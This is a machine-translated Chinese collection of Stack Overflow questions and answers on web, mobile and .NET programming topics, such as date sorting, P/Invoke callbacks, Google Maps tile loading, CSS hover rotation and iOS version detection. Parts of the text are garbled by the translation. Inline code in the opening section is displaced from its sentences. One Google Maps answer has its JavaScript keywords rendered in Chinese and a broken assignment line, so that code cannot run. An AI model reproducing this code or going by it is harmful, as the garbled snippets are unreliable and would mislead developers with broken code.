    要修复它，您必须为此编写自己的函数（这并不复杂），或者找到一个为您完成它的插件。

3.  即使`sort`确实有效，您传入的日期字符串也采用,等`new Date(string)`形式。这不是记录在案以便理解的格式。记录在案的唯一[要理解的字符串格式是](http://ecma-international.org/ecma-262/5.1/#sec-15.9.1.15)[ISO-8601](http://en.wikipedia.org/wiki/ISO_8601)的简化形式，它看起来不像那样。事实上，在 Chrome 和其他浏览器上都失败了。`20/10/2012``17/10/2012``new Date(string)`[`new Date(string)`](http://ecma-international.org/ecma-262/5.1/#sec-15.9.1.15)`new Date("20/10/2012")`

    要修复它，您需要以另一种方式获取日期。您可以将元素上的毫秒以来的时间值存储为[`data-*`属性](http://www.w3.org/TR/html5/global-attributes.html#embedding-custom-non-visible-data-with-the-data-%2a-attributes)，然后直接使用它。或者您可以解析自己拥有的日期字符串。如果它们始终采用这种`dd/mm/yyyy`格式，则将各个部分解析为数字是微不足道的，然后您可以将年、月和日的结果数字传递到[`new Date(year, month, date)`](http://ecma-international.org/ecma-262/5.1/#sec-15.9.3.1). （请记住，月份从`0`= 一月开始。）

4.  你在`</li>`一开始就关闭了，没有开口`<li>`。

    要修复它，请不要这样做。:-)

# ios - Xcode ios 未知类型名称？

> ID：13280314
> 
> 赞同：15
> 
> 时间：2012-11-07T23:52:09.087
> 
> 标签：ios, xcode, class, forward-declaration, circular-dependency

我对以下错误有疑问“ `Unknown type name VistaDereIzq`”

我有一个视图叫做`VistaDereIzq`. 我执行以下操作以在此视图中添加该视图。

```
#import <UIKit/UIKit.h> 
#import <MessageUI/MessageUI.h>
#import "VistaDereIzq.h"
#import "ViewController.h"

@interface VistaNavegador : UIViewController  <UIWebViewDelegate>
{ 
    VistaDereIzq *VistaIzq2;   <----- "Unknown type name VistaDereIzq"
}

@end 
```

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2012-11-08T01:53:08.027

你可能有一个循环依赖/包含。使用前向声明 ( `@class MONClass;`) 而不是`#import`ing 标头。由于没有物理依赖，您应该首先使用前向声明（即更快的构建）。

所以而不是：

```
#import "VistaDereIzq.h" 
```

采用：

```
@class VistaDereIzq; 
```

然后根据需要将您的添加`#import`到`.m`文件中。

# c# - 从 C# 调用包含函数指针的 DLL 函数

> ID：13280323
> 
> 赞同：4
> 
> 时间：2012-11-07T23:53:28.907
> 
> 标签：c#, c++, dll, function-pointers

我有一个用 C++ 编写的 DLL，其中包括导出的函数，该函数具有用作回调函数的函数指针。

```
// C++ 
DllExport unsigned int DllFunctionPointer( unsigned int i, unsigned int (*TimesThree)( unsigned int number ) ) {
    return TimesThree( i )  ; 
} 
```

我有一个 CSharp 应用程序，我想用它来调用 DLL 函数。

```
// C#
public unsafe delegate System.UInt32 CallBack( System.UInt32 number ); 
class Program
{
    [DllImport("SimpleDLL.dll")]
    public static extern System.UInt32 DllFunctionPointer( System.UInt32 i, CallBack cb) ;

    static unsafe void Main(string[] args)
    {
        System.UInt32 j = 3;
        System.UInt32 jRet = DllFunctionPointer(j, CallBack );
        System.Console.WriteLine("j={0}, jRet={1}", j, jRet); 
    }

    static System.UInt32 CallBack( System.UInt32 number ) {
        return number * 3 ; 
    }
} 
```

上面代码的问题是应用程序崩溃并显示以下错误消息。

```
'CallingACallbackFromADLL.vshost.exe' (Managed (v4.0.30319)): Loaded 'C:\XXXX\CallingACallbackFromADLL.exe', Symbols loaded.
Managed Debugging Assistant 'PInvokeStackImbalance' has detected a problem in 'C:\XXXX\CallingACallbackFromADLL.vshost.exe'.
Additional Information: A call to PInvoke function 'CallingACallbackFromADLL!CallingACallbackFromADLL.Program::DllFunction' has unbalanced the stack. This is likely because the managed PInvoke signature does not match the unmanaged target signature. Check that the calling convention and parameters of the PInvoke signature match the target unmanaged signature.

The program '[9136] CallingACallbackFromADLL.vshost.exe: Managed (v4.0.30319)' has exited with code 1073741855 (0x4000001f). 
```

我不确定下一步该做什么。

我的问题是：

*   从 C# 应用程序调用包含回调指针的 C++ DLL 函数的正确方法是什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T00:09:16.077

这是因为默认情况下函数的调用约定`C#`是 is`__stdcall`但`C/C++`默认是 is `__cdecl`，所以你应该改变你的函数的调用约定如下：

```
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate void TimesTree( uint frame );
[DllImport("SimpleDLL.dll")]
public static extern System.UInt32 DllFunctionPointer( uint i,
    [MarshalAs(UnmanagedType.FunctionPtr)] TimesTree callback ) ;

static unsafe void Main(string[] args)
{
    // ...
    System.UInt32 jRet = DllFunctionPointer(j, CallBack );
    // ...
} 
```

# javascript - 阻止谷歌地图加载超出特定缩放级别

> ID：13280332
> 
> 赞同：1
> 
> 时间：2012-11-07T23:55:08.353
> 
> 标签：javascript, google-maps

我有一个带有一些叠加层的谷歌地图，当缩放高于某个值（比如 17）时，叠加层完全覆盖了地图。

我想防止地图图块加载超出该缩放级别，因为它位于叠加层后面，并且会导致不必要的数据传输。是否可以？

编辑：

我需要类似的东西：

```
google.maps.event.addListener(map, 'zoom_changed', function() { 
    if(map.getZoom()>=zoomToHideMap)
        stopLoadingTiles();
    else
        startLoadingTiles();
}); 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-30T02:57:08.703

我的解决方案是在 onzoomchanged 事件上将 Map Type 更改为 null。

```
google.maps.event.addListener(map, 'onzoomchanged', function() {
    if(closeEnough)
        map.setMapTypeId(null)
    else
        map.setMapTypeId(google.maps.MapTypeId.SATELLITE)
}) 
```

由于覆盖层完全覆盖了地图，我将其用作基础层而不是覆盖层以进行一定程度的缩放。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:15:49.283

如果您使用[OpenLayers](http://openlayers.org)，您可以更好地控制地图的行为。您仍然可以使用 Google 的地图图像：

*   [http://openlayers.org/dev/examples/google-v3.html](http://openlayers.org/dev/examples/google-v3.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T00:18:02.133

不是来自我，但很有趣：

```

            html，正文 { 高度：100%;}
            #map_canvas { 高度：1000px;}

            变量选项 =
            {
                getTileUrl：函数（坐标，缩放）
                {
                    // 不要为重复的地图加载瓦片
                    var tileRange = 1 = tileRange || coord.x = tileRange )
                        返回空值；

                    // 加载请求坐标的图块
                    var 文件 = '图像/缩放' + 缩放 + '/tile_' + 缩放 + '_' + (coord.x) + '_' + (coord.y) + '.jpg';

                    返回文件；
                },
                tileSize: 新的 google.maps.Size(256, 256),
                最小缩放：1，
                最大缩放：9，
                radius: 1738000, // 我是从 api 中的一个示例中得到的，我不知道这是做什么的
                名称：'地图'，
            };
            var mapOptions =
            {
                中心：新的 google.maps.LatLng(0,0)，
                缩放：2，
                背景颜色：'#000',
                街景控制：假，
                地图类型控制：假
            };

            var map = new google.maps.Map(document.getElementById('map_canvas'),mapOptions);
            var mapType = new google.maps.ImageMapType(options);
            map.mapTypes.set('map', mapType);
            map.setMapTypeId('地图');

            var 标记 = 新的 google.maps.Marker({
                    位置：新的 google.maps.LatLng(0,0)，
                    地图：地图，
                    作品名称：《测试》
            });

```

# java - 在 Android 主机和 USB 设备之间建立通信

> ID：13280333
> 
> 赞同：1
> 
> 时间：2012-11-07T23:55:11.567
> 
> 标签：java, android, usb, communication

我正在尝试实现 android 主机和 USB 设备之间的双向通信，当然我使用的是 Google 提供的 USB Host API。USB 设备包含一个固件，它会响应它接收到的任何字符。用户只需在 EditText 中插入一个字符并按下按钮即可发送该字符。这是代码

```
public void sendData(View v){
    final String character = request.getText().toString() + "\n\r";
    log.setText(log.getText() + "\n" + "Sending...");
    if(character != null){          
        Thread t = new Thread(new Runnable() {              
                @Override
                public void run() {                     
                    byte[] array = character.getBytes();
                    Log.d("USB", "Sending Data...");
                    mDeviceConnection.bulkTransfer(mEndpointOut, array, array.length, 100);                 
                    ByteBuffer output_buffer = ByteBuffer.allocate(array.length);
                    Log.d("USB", "Creating Buffer");
                    UsbRequest req = new UsbRequest();
                    req.initialize(mDeviceConnection, mEndpointIn);
                    req.queue(output_buffer, array.length);                             
                    if(mDeviceConnection.requestWait() == req){
                        Log.d("USB", output_buffer.getChar(0) + "");                            
                        Message m = new Message();
                        m.obj = output_buffer.array();
                        handler.sendMessage(m);
                        output_buffer.clear();                      
                    } else{
                        Log.d("USB", "No USBRequest received");
                    }
                }
            });
        t.start();
    } 

} 
```

变量请求是 EditText，日志是对 TextView 的引用，因此我可以显示一些调试信息。首先我使用 bulkTransfer 方法发送字符，然后我使用 USBRequest 排队请求读取 in 端点上的数据，显然它正确发送了字符，但是当我显示接收到的字符时，它显示了一些奇怪的符号，比如汉字或内部带有问号的菱形（几乎总是这是响应）。我想知道我用于此通信的代码是否正确，如果正确，那我为什么会收到那些奇怪的字符？

非常感谢你的帮助

PD：对不起我的英语。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-18T20:40:36.070

如果您发送字节数组，您还将获得字节数组。

所以使用方法`get(index of byte)`而不是使用`getChar(index)`！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:57:31.717

我对这个问题有点不清楚。但如果您使用一些 minicom/putty 类型的终端应用程序来显示显示，我建议正确设置波特率。如果这不是问题，你能澄清一下你说收到的字符 - 它是指在 Android 主机设备上收到的字符还是意味着 USB 设备？

# css - 如何通过将鼠标悬停在css3中的不同div上来旋转图像？

> ID：13280337
> 
> 赞同：2
> 
> 时间：2012-11-07T23:55:21.120
> 
> 标签：css

我有一个图像和 4 个不同的 div。我试图根据悬停的 div 以不同的角度旋转该图像。到目前为止，我只能通过将鼠标悬停在自身上来旋转图像。没有亲子关系。我想做的事情可以实现吗？

**HTML**

```
<div id="line">
<img src="images/Line2.png" id="liner" alt="settings" />
</div>
<div id="d1">
</div>
<div id="2">
</div> 
```

**CSS**

```
#d1:hover + #liner {
-webkit-transition-duration: 0.8s;
-moz-transition-duration: 0.8s;
-o-transition-duration: 0.8s;
transition-duration: 0.8s;
-webkit-transition-property: -webkit-transform;
-moz-transition-property: -moz-transform;
-o-transition-property: -o-transform;
transition-property: transform;
overflow:hidden;
-webkit-transform: rotate(180deg);
-moz-transform: rotate(180deg) ;
-o-transform: rotate(180deg);
-ms-transform: rotate(180deg);
transform: rotate(180deg); 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T04:05:08.643

最明智的解决方案是使用 javascript 执行此操作。但是如果你想纯粹在 CSS3 中做到这一点，这是可能的。查看我为您整理的这个 JSFiddle：

[http://jsfiddle.net/4NQfj/](http://jsfiddle.net/4NQfj/)

诀窍是嵌套 div，最后将图像嵌套在最深处。例如：

```
<div id="d1">
    <div id="d2">
        <div id="d3">
            <img id="couldBeAnImage" src="...">
        </div>
    </div>
</div> 
```

然后，您可以通过在每个 div 的 :hover 上限定图像来简单地调整图像的变换属性。所以为了缩短小提琴中的代码，我基本上是这样做的：

```
#d1:hover #couldBeAnImage { transform: rotate(15deg); }
#d2:hover #couldBeAnImage { transform: rotate(30deg); }
#d3:hover #couldBeAnImage { transform: rotate(45deg); } 
```

您想使用 javascript 的原因是因为每个 div 都需要调整大小和定位，才能使这个技巧起作用。这不是问题，只是假设您可以做到这一点并不总是现实的：a.) 给定您的布局，并且.. b.) 处理每个 div 和后续图像的位置都相对于每个祖先的事实分区。

所以这有点棘手，但这是您所描述问题的 100% CSS 解决方案。如果我自己不这么说，解决起来很有趣:)

**编辑：**

当然你也可以用 javascript 做到这一点。这是一个小提琴，展示了一个稍微“草率”的解决方案：

[http://jsfiddle.net/k3t2U/1/](http://jsfiddle.net/k3t2U/1/)

这样做的方法是向 div 添加 mouseover 和 mouseout 事件。在这种情况下，div 可以完全相互独立：

```
<div id="d1"></div>
<div id="d2"></div>
<div id="d3"></div>
<div id="couldBeAnImage"></div> 
```

在我的示例中，我使用了 jQuery 的 .hover() 方法来添加事件处理程序。悬停基本上让你这样做：.hover(functionToCallOnMouseOver(), functionToCallOnMouseOut())

所以我仍在处理 CSS 中的旋转。我有三个类代表不同级别的轮换。然后在我的 mouseOver 和 mouseOut 事件处理程序中添加或删除指定各种旋转量的类。

```
$("#d1").hover(function(){
    $("#couldBeAnImage").addClass("rotate");
},function(){
    $("#couldBeAnImage").removeClass("rotate");
}); 
```

在 javascript 中，您可以通过多种方式真正做到这一点。所以这只是一个例子。从某种意义上说，它更强大，您可以更自由地控制实际元素。CSS 方法基本上是一种“技巧”，您在如何指定标记和样式方面受到极大限制。一般来说，我建议使用 javascript 解决这个问题。

# apache-flex - 在火花按钮上截断的动态标签

> ID：13280338
> 
> 赞同：0
> 
> 时间：2012-11-07T23:55:28.563
> 
> 标签：apache-flex, button, air, adobe, flex-spark

我在屏幕上有一个火花按钮，我正在使用 actionscript 动态更新标签，如下所示：

```
discount.label = this.data.SelectedDiscount.discount + "%"; 
```

问题是新标签文本被截断，即使有空间。

最初，按钮中的标签是空白的：

![黑色按钮标签](../Images/9b7586f48db804c4f515894e57c5963c.png)

然后在我用上面的代码更改标签后，它看起来像这样，当它应该说“30%”时：

![截断的文本](../Images/1439d0c06ac283da0d94949e34394020.png)

但是，如果我然后单击该按钮，它会更新显示并正确呈现：

![正确渲染标签](../Images/597ed063976109fb2163ac1c6b8be4ea.png)

我尝试了所有各种无效和验证方法，使用按钮宽度等等，都无济于事。如果初始标签更宽，具有类似“------”的值，那么它可以正常工作，但不幸的是，一串空格并不能解决问题。出于可用性原因，我真的不想要一串“0%”或“00%”，那么有什么简单的方法可以让它正常工作吗？

最好我想避免为了实现这一点而伪造鼠标点击。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:29:58.263

感谢@www.Flextras.com 的指导，我通过`invalidateSize()`在按钮的皮肤而不是按钮本身上调用方法来完成这项工作，即：

```
discount.skin.invalidateSize(); 
```

# jquery - Jquery显示列表中的下一个项目

> ID：13280342
> 
> 赞同：0
> 
> 时间：2012-11-07T23:56:26.820
> 
> 标签：jquery, html-table

我制作了一个表格列表，其中显示了许多记录。目前每次最多显示 10 个。我制作了一个按钮，单击该按钮将显示表中的下 10 条记录。我想知道如何对其进行编码以使其工作？

```
function showAll(qstring,qtype){
 $("#vsdiv").show();
 var myurl="scripts/searchadmin.php"; 
 $.ajax({
  url: myurl, dataType:'json',data:{querystring:qstring,querytype:qtype},
  success: function(member){
   $("#resultstable").append('<tr class="yellow">'+
                                        '<th>#REC</th><th>JOINED</th><th>USER NAME</th>'+
                                        '<th>CONTACT</th><th>ADDRESS</th><th>PHONE</th>'+
                                        '<th>EMAIL</th><th>STATUS</th><th>SELECT</th></tr>');
   var j=0;var totrecs=1;
   for(var i=0;i<10;i++){
    $("#resultstable").append('<tr class="trow'+j+'">'+
                  '<td class="ids" id="z'+i+'">'+totrecs+'</td>'+
          '<td>'+member[i].jdate+'</td>'+
          '<td class="users"     id="username'+i+'">'+member[i].username+'</td>'+
          '<td id="contact'+i+'">'+member[i].fname+' '+member[i].lname+'</td>'+
          '<td id="myaddress'+i+'">'+member[i].address1+' '+member[i].town+'</td>'+
          '<td id="phone'+i+'">'+member[i].phone+'</td>'+
          '<td id="email'+i+'">'+member[i].email+'</td>'+
          '<td id="status'+i+'">'+member[i].status+'</td>'+
          '<td><input type="checkbox" name="whome" id="showMe'+i+'"'+
                                         'class="boxes" onclick="getMe('+i+')" /></td></tr>');  
                                         $('#sr').html('Showing 1 of '+member.length+' Members')

});

  totrecs++;
  j++;
 }
}
});
} 
```

这是当前显示前 10 条记录的功能，当我单击按钮时如何显示下一组 10 条记录？有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:17:13.563

您可以实现此目的的一种方法是将范围信息添加到您的查询中，这可能看起来像这样：

```
var rangestart = 0;
var rangeend = 9;
var rangeincrement = 10;
function showAll(qstring,qtype){
 $("#vsdiv").show();
 var myurl="scripts/searchadmin.php"; 
 $.ajax({
  url: myurl, dataType:'json',data:{querystring:qstring,querytype:qtype,rangestart:rangestart,rangeend:rangeend},
  success: function(member){
   $("#resultstable").append('<tr class="yellow">'+
                                        '<th>#REC</th><th>JOINED</th><th>USER NAME</th>'+
                                        '<th>CONTACT</th><th>ADDRESS</th><th>PHONE</th>'+
                                        '<th>EMAIL</th><th>STATUS</th><th>SELECT</th></tr>');
   var j=0;var totrecs=1;
   for(var i=0;i<10;i++){
    $("#resultstable").append('<tr class="trow'+j+'">'+
                  '<td class="ids" id="z'+i+'">'+totrecs+'</td>'+
          '<td>'+member[i].jdate+'</td>'+
          '<td class="users"     id="username'+i+'">'+member[i].username+'</td>'+
          '<td id="contact'+i+'">'+member[i].fname+' '+member[i].lname+'</td>'+
          '<td id="myaddress'+i+'">'+member[i].address1+' '+member[i].town+'</td>'+
          '<td id="phone'+i+'">'+member[i].phone+'</td>'+
          '<td id="email'+i+'">'+member[i].email+'</td>'+
          '<td id="status'+i+'">'+member[i].status+'</td>'+
          '<td><input type="checkbox" name="whome" id="showMe'+i+'"'+
                                         'class="boxes" onclick="getMe('+i+')" /></td></tr>');  
                                         $('#sr').html('Showing 1 of '+member.length+' Members')

});

  totrecs++;
  j++;
 }
 rangestart += rangeincrement; // this assigns the new range start value
 rangeend += rangeincrement; // assign new range end value
}
});
} 
```

然后您的按钮再次执行相同的查询。您还需要在服务器端更改查询以仅返回您需要的范围，例如

```
SELECT * FROM xyz WHERE xyz.somevalue = querystring LIMIT rangestart, rangeend; 
```

这应该得到你正在寻找的结果。

# javascript - 如何使用 jquery 检测特定的 iOS 版本？

> ID：13280343
> 
> 赞同：10
> 
> 时间：2012-11-07T23:56:33.753
> 
> 标签：javascript, google-maps, ios6, ios6-maps

为了使地图链接像以前一样打开地图应用程序，我想根据用户使用的是 iOS 6 还是其他（iOS 4、5、Android 等）显示不同的链接。

类似的东西： -- 如果在 iOS 6.0 或更高版本上，显示[http://maps.apple.com?q=](http://maps.apple.com?q=) "address"，如果其他，显示[http://maps.google.com?q=](http://maps.google.com?q=) "address"。

**注意**：我意识到您也可以直接调用地图应用程序，而不是通过网络链接（现在不方便），但这不能解决问题，因为 Android 或较小的 iOS 上的人将无法使用那。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-08T00:05:23.357

`navigator.userAgent`您可以使用该字符串检测 iOS 版本。就像是：

```
if(/(iPhone|iPad|iPod)\sOS\s6/.test(navigator.userAgent)) {
    // use apple maps
} 
```

请注意，这绝不是未来的证明，用户代理字符串可以更改，操作系统也会更改。同样 AFAIK，通过浏览器的谷歌地图可在所有平台上使用，包括 iOS 6。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-25T08:08:30.937

这里有一点 JS 来确定 iOS 和 Android OS 版本。不需要 jQuery。

使用 iOS 4.3 到 6.0.1 和 Android 2.3.4 到 4.2 的实际用户代理字符串进行测试

```
var userOS;    // will either be iOS, Android or unknown
var userOSver; // this is a string, use Number(userOSver) to convert

function getOS( )
{
  var ua = navigator.userAgent;
  var uaindex;

  // determine OS
  if ( ua.match(/iPad/i) || ua.match(/iPod/i) || ua.match(/iPhone/i) )
  {
    userOS = 'iOS';
    uaindex = ua.indexOf( 'OS ' );
  }
  else if ( ua.match(/Android/i) )
  {
    userOS = 'Android';
    uaindex = ua.indexOf( 'Android ' );
  }
  else
  {
    userOS = 'unknown';
  }

  // determine version
  if ( userOS === 'iOS'  &&  uaindex > -1 )
  {
    userOSver = ua.substr( uaindex + 3, 3 ).replace( '_', '.' );
  }
  else if ( userOS === 'Android'  &&  uaindex > -1 )
  {
    userOSver = ua.substr( uaindex + 8, 3 );
  }
  else
  {
    userOSver = 'unknown';
  }
} 
```

然后要检测特定版本及更高版本，请尝试：

```
if ( userOS === 'iOS' && Number( userOSver.charAt(0) ) >= 5 ) { ... } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-08T00:05:08.133

您想查看用户代理字符串。Safari 网络浏览器有一种方法可以报告正在使用的设备（iPad、iPhone 等）以及版本号，因此它是那个紧凑的小字符串中信息的 indexOf 问题。

[http://developer.apple.com/library/IOS/#documentation/AppleApplications/Reference/SafariWebContent/OptimizingforSafarioniPhone/OptimizingforSafarioniPhone.html#//apple_ref/doc/uid/TP40006517-SW3](http://developer.apple.com/library/IOS/#documentation/AppleApplications/Reference/SafariWebContent/OptimizingforSafarioniPhone/OptimizingforSafarioniPhone.html#//apple_ref/doc/uid/TP40006517-SW3)

其他一些有用/非常相关的 Stackoverflow 问题：

[使用 JavaScript 检测低于 5 的 iOS 版本](https://stackoverflow.com/questions/8348139/detect-ios-version-less-than-5-with-javascript)

[在网页上检测 iOS 版本](https://stackoverflow.com/questions/7575504/detecting-ios-version-on-a-web-page)

[使用 PHP 或 Javascript 检查 iOS 版本是否为 3.0 或更高](https://stackoverflow.com/questions/7399534/check-if-ios-version-is-3-0-or-higher-with-php-or-javascript)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-08T00:06:47.007

使用 JavaScript 查看用户代理标头。

```
navigator.userAgent 
```

# c# - 当应用程序位于站点根目录时，FormsAuthentication.RedirectToLoginPage 不起作用

> ID：13280347
> 
> 赞同：1
> 
> 时间：2012-11-07T23:57:00.413
> 
> 标签：c#, asp.net, .net, c#-4.0, iis-7.5

我一直在开发的应用程序（ASP.Net 4 / C#）使用 FormsAuthentication.RedirectToLoginPage() 在用户单击注销按钮后将其发送回登录页面。

我发现当应用程序部署在 IIS 站点的根目录时，重定向不起作用。单击注销按钮只会重新加载页面。

当应用程序部署到站点内的应用程序虚拟文件夹时，重定向工作属性。

我也尝试过使用 Respond.Redirect()，它也不起作用。我尝试从头开始重新创建该站点（不走运）。

更新：我已经能够在另一台机器上验证这种行为，所以我很有信心它不仅仅是一个网络服务器。

注销按钮的代码：

```
 protected void lbLogout_Click(object sender, EventArgs e)
    {
        FormsAuthentication.SignOut();
        Session.Abandon();

        // clear authentication cookie
        HttpCookie cookie1 = new HttpCookie(FormsAuthentication.FormsCookieName, "");
        cookie1.Expires = DateTime.Now.AddYears(-1);
        cookie1.Path = FormsAuthentication.FormsCookiePath;
        cookie1.HttpOnly = true;
        Response.Cookies.Add(cookie1);

        // clear session cookie 
        HttpCookie cookie2 = new HttpCookie("ASP.NET_SessionId", "");
        cookie2.Expires = DateTime.Now.AddYears(-1);
        Response.Cookies.Add(cookie2);

        FormsAuthentication.RedirectToLoginPage();
        //Response.Redirect("~/login.aspx");
        Response.End();
    } 
```

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-10T04:33:55.147

内部`FormsAuthentication.RedirectToLoginPage`所做的就是调用 Response.Redirect。另外，打电话是不好的做法`Response.End`。我建议使用[Fiddler](http://www.fiddler2.com/fiddler2/ "提琴手")之类的跟踪工具来查看调用该方法时实际响应包含的内容。这应该对浏览器正在接收的内容有所了解。

`Response.Redirect`不起作用的事实表明存在更大的问题。如果 HTTP 302 未返回给客户端，则 ASP.net 管道中的某些内容妨碍了重定向响应。

# ruby-on-rails - Twitter API 与 Web 抓取？

> ID：13280350
> 
> 赞同：0
> 
> 时间：2012-11-07T23:57:06.060
> 
> 标签：ruby-on-rails, ruby, twitter, nokogiri, mechanize-ruby

首先，我想获得我 Twitter 帐户的所有关注者。我做了一些研究，发现我们可以使用 Ruby on rails 进行网页抓取：Nokogiri 或 Mechanize gems。我还有一个用于网络抓取的 CSS 选择器。现在，如果我查找 HTML 页面源代码，它不会显示该帐户的所有关注者。

我真的可以使用网络抓取代码来获取我所有的 Twitter 关注者，还是应该使用 Twitter API？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-08T00:09:22.797

一般而言，尽可能绝对使用 API。

顾名思义，“抓取”只是处理应用程序的“表面”，在 MVC 术语中是它的 (HTML) 视图。这些观点随时可能发生变化——想想推特和其他类似服务有多少次进行网站重新设计。如果您正在抓取，那么每个站点的重新设计，即使是较小的，很可能会破坏您现有的代码，迫使您（没有警告）根据猜测进行疯狂的更新。

Nokogiri 和 Mechanize 是强大的工具，但它们永远无法与 API 的功能、稳定性和一致性相比，后者直接访问数据库内容，完全绕过不断变化的“表面”。在 Twitter 的情况下，您可以获得 API 包装器的额外好处，例如用于访问 API 的[Twitter gem](https://github.com/sferik/twitter)，它为 API 添加了一个用户友好的层，使其更容易集成到您的应用程序中。

所以总结一下：使用 API，可能通过 API 包装器，例如 Twitter gem。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-08T00:02:49.493

当服务不提供 API 或 API 不能充分提供您需要的所有功能时，Web 抓取通常是最后的手段。

*我会先研究API。这就是它的设计目的。*

网页抓取可能会出现问题，因为网站的结构可能会发生巨大变化并破坏您的代码运行。

通常，公共 API 往往具有某种约定，不会对所提供的数据进行重大更改。如果有更改，API 将提供 API 的版本控制（调用旧版本 API 的能力）或提供有关更改内容和更改时间的信息的文档。

此外，网络抓取还有其他成本，例如额外的带宽。从 API 获得的数据通常在应用程序中更有用。

还有很多库（ruby gems），它们将提供访问所需 API 所需的许多基本功能。当 API 更新时，它们通常也会更新。

# php - 在这种情况下，我想触发另一种异常。PHP

> ID：13280352
> 
> 赞同：0
> 
> 时间：2012-11-07T23:57:07.613
> 
> 标签：php, exception

当我尝试使用此代码连接 Redis 服务器时，我没有任何问题测试服务器是否已启动。问题是当服务器关闭时。在那种情况下，我用经典的 Try/catch 解决了这个场景。我的问题是我想用“my_custom_exception”类来管理这个异常，它有更多有用的功能，而不是异常类。反正有做这个吗？我知道如何扩展 Exception 类，但在这种情况下是第三方库。

```
function show_status_redis_server(){
    try{
        $redis = RedisDB::fetch_instance();//this ...........................
    }catch(Exception $e){
        echo "Redis server is down"; 
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:09:07.683

正如@Mike 在他的评论中所说，这取决于您想在哪里使用该功能。最简单的事情是使用类在代码中处理它：

```
function show_status_redis_server(){
    try{
        $redis = RedisDB::fetch_instance();//this ...........................
    }catch(Exception $e){
        throw MyRedisException::createFromException($e); 

    }
} 
```

或者

```
function show_status_redis_server(){
    try{
        $redis = RedisDB::fetch_instance();//this ...........................
    }catch(Exception $e){
        $re = MyRedisException::createFromException($e);
        // do stuff with $re here 

    }
} 
```

Beynond，我可以想到两种方法......制作一个使用您正在使用的 redis 库但充当中间件的包装库 - 这样您就可以在库类中捕获通用异常，然后抛出任何您想要的。

第二种方法是只做一个自定义错误处理程序来捕获未捕获的异常 - 以某种方式检查它们是否有 redis，然后重新抛出自定义异常。但是，此时您必须让异常消失，直到执行结束，这并没有为您提供很多处理它们的选项，除非它只是格式化和输出消息。

# python - 查找元音替换的所有组合

> ID：13280357
> 
> 赞同：4
> 
> 时间：2012-11-07T23:57:26.140
> 
> 标签：python, string, list, combinations

我试图找到一个单词中所有元音的所有可能组合。例如，给定“你好”：

`[halla, halle, halli, hallo, hallu, hella, halle, halli, hallo, hallu...]`

我编写了以下函数，它将只获取每个元音，并且在每个元音处，它将全部替换为元音并将每个版本添加到列表中。我正在尝试将其更改为我想要的排列，但它不起作用。我尝试在追加后插入元音（“”.join（string），arr），但这会导致无限递归。

```
def vowels(word, arr=None):
    if arr is None:
        a = []

    for i, c in enumerate(word):
        if c in 'aeiou':
            for v in 'aeiou':
                string = list(word)
                string[i] = v
                arr.append("".join(string))
    return arr 
```

有没有人有什么建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:47:07.860

一旦 CristopheD 提到的错字被修复，您的函数将返回：

```
['hallo', 'hello', 'hillo', 'hollo', 'hullo', 'hella', 'helle', 'helli', 'hello', 'hellu'] 
```

...所以它返回了一些可能的组合，但不是全部。

那是因为它依次获取单词中的每个元音，并依次用每个元音替换它，然后继续处理单词中的下一个元音 - 但*不*考虑它在遇到后续元音时找到的前一个元音. 这是一个递归解决方案，适用于具有任意数量元音的单词：

```
import re

VOWELS = "aeiou"
RE_VOWEL = re.compile("[%s]" % VOWELS)

def helper(parts):
    if len(parts) == 1:
        yield parts[0]
    else:
        for vowel in VOWELS:
            for item in helper([vowel.join(parts[:2])] + parts[2:]):
                yield item

def vowels(word):
    parts = re.split(RE_VOWEL, word)
    return list(helper(parts)) 
```

# c# - 将字节数组转换为对象数组

> ID：13280358
> 
> 赞同：3
> 
> 时间：2012-11-07T23:57:28.067
> 
> 标签：c#, c#-4.0

> **可能重复：**
> [无法将值类型数组转换为参数对象 []](https://stackoverflow.com/questions/9104268/cant-convert-value-type-array-to-params-object)

为什么是

```
object h = new byte(); 
```

可能和

```
object[] h = new byte[5]; 
```

不是？

如何将字节数组转换为对象数组？

谢谢你！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-08T00:02:29.290

第一个示例将*单个值*框起来。

在第二个示例中，您尝试转换整个数组。那是行不通的。`object`数组的每个元素都是一个`object`变量。`byte`数组的每个元素都是一个`byte`变量。他们不分享代表 - 你就是做不到。

您可以很容易地从字节数组创建一个*新的对象数组，例如*

```
object[] objects = bytes.Cast<object>().ToArray(); 
```

...但是您不能将字节数组视为*对象*数组。

或者，您*可以*使用与`System.Array`兼容的类型`byte[]`。这对你有帮助吗？

```
byte[] bytes = ...;
Array array = bytes; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T00:04:29.300

当您尝试在代码中转换数组时，转换失败，因为您将保存类型字节的数组转换为保存类型对象的数组；数组持有的类型不一样。当您将值类型转换为类型对象时，您就是在装箱（拆箱将对象转换为值类型）。`object h = new byte();`是拳击。当您在数组代码中进行强制转换时，这不是装箱，这就是它失败的原因。

# r - 直线和圆之间的截距

> ID：13280359
> 
> 赞同：0
> 
> 时间：2012-11-07T23:57:39.710
> 
> 标签：r, math

想象一下，我们有一个由以下定义的圆圈：

```
X^2 + Y^2 = r^2 
```

